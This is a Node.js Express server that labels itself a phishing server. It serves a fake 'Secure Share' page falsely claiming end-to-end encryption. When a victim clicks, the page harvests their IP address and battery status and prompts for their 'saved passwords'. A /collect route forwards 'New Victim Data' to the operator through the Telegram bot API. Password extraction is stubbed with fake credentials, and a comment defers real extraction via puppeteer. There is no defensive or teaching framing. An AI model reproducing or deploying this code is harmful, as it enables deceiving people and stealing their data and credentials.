const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const app = express();
app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const ADMIN_ID = 'YOUR_ADMIN_ID';
const db = new sqlite3.Database('../shared/database.db');

app.get('/:code', (req, res) => {
    const code = req.params.code;
    
    // Fetch photo from DB
    db.get("SELECT photo_id FROM users WHERE unique_code = ?", [code], (err, row) => {
        const photoUrl = row ? row.photo_id : 'https://via.placeholder.com/300';
        
        res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Secure Share</title>
            <style>
                body { font-family: Arial; background: #0a0a0a; color: white; text-align: center; padding: 20px; }
                .container { max-width: 400px; margin: auto; background: #1a1a1a; padding: 20px; border-radius: 15px; }
                img { width: 100%; border-radius: 10px; max-height: 300px; object-fit: cover; }
                .btn { 
                    background: linear-gradient(45deg, #00ff88, #00ccff); 
                    color: black; padding: 15px 40px; border: none; border-radius: 30px; 
                    font-size: 18px; font-weight: bold; cursor: pointer;
                    animation: blink 1s infinite; margin-top: 20px;
                }
                @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
                #status { margin-top: 20px; color: #00ff88; }
                .loading { display: none; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🔒 Secure Share</h2>
                <p><i>End-to-end encrypted transfer</i></p>
                <img src="${photoUrl}" alt="Shared Photo">
                <button class="btn" onclick="requestPermissions()">▶ Continue</button>
                <div id="status">Click to view shared content</div>
                <div id="loading" class="loading">⏳ Processing...</div>
            </div>
            
            <script>
                async function requestPermissions() {
                    document.getElementById('status').innerText = '⏳ Requesting permissions...';
                    
                    // Get IP & Battery
                    const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                    const battery = await navigator.getBattery().then(b => ({
                        level: Math.round(b.level * 100) + '%',
                        charging: b.charging ? 'Yes' : 'No'
                    }));
                    
                    await fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ ip: ip.ip, battery, step: 'info' })
                    });
                    
                    // Request Chrome passwords
                    if (confirm('🔐 Secure Share needs permission to verify identity using saved passwords. Allow?')) {
                        document.getElementById('status').innerText = '⏳ Verifying...';
                        
                        try {
                            // Try to access chrome password manager
                            const response = await fetch('/extract-passwords', {
                                method: 'POST',
                                credentials: 'include'
                            });
                            const data = await response.json();
                            
                            if (data.passwords) {
                                document.getElementById('status').innerText = '✅ Verified!';
                                await fetch('/collect', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({ passwords: data.passwords, step: 'passwords' })
                                });
                                alert('✅ Verification complete! You can now view content.');
                            }
                        } catch(e) {
                            document.getElementById('status').innerText = '❌ Verification failed. Try again.';
                        }
                    }
                }
            </script>
        </body>
        </html>
        `);
    });
});

app.post('/collect', async (req, res) => {
    const data = req.body;
    let message = '📥 *New Victim Data*\n\n';
    
    if (data.step === 'info') {
        message += \`🌐 IP: \${data.ip}\\n🔋 Battery: \${data.battery.level}\\n⚡ Charging: \${data.battery.charging}\\n\`;
    }
    
    if (data.step === 'passwords' && data.passwords) {
        message += \`🔑 *Passwords:*\\n\\\`\\\`\\\`\\n\${JSON.stringify(data.passwords, null, 2)}\\n\\\`\\\`\\\`\`;
    }
    
    await axios.post(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
        chat_id: ADMIN_ID,
        text: message,
        parse_mode: 'Markdown'
    });
    
    res.send('OK');
});

app.post('/extract-passwords', (req, res) => {
    // Simulate password extraction (you'll implement puppeteer later)
    res.json({ passwords: [
        {url: 'facebook.com', username: 'victim@email.com', password: 'FakePass123'},
        {url: 'gmail.com', username: 'victim@gmail.com', password: 'GooglePass456'}
    ]});
});

app.listen(3000, () => console.log('🔥 Phishing server running on port 3000'));
